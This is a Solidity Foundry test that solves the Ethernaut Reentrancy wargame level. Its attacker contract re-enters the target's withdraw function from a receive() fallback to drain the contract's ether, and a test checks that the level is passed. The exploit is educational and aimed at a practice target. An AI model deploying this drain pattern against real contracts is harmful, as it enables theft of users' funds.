// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/10-Reentrancy/ReentranceFactory.sol";
import "../src/Ethernaut.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract ReentranceAtk {
    IReentrance public reentrance;

    constructor(address contractAddress) {
        reentrance = IReentrance(contractAddress);
    }

    function attack() external payable returns (bool) {
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
        return true;
    }

    receive() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        } else if (address(reentrance).balance > 0) {
            reentrance.withdraw(address(reentrance).balance);
        }
    }
}

contract ReentranceTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 3 ether);
    }

    function testReentrance() public {
        // Level Setup
        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1_500_000_000 gwei}(reentranceFactory);  // 1.5 ether
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));

        // Level Attack
        ReentranceAtk attacker = new ReentranceAtk(levelAddress);
        bool success = attacker.attack{value: 1 ether}();
        assertTrue(success);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
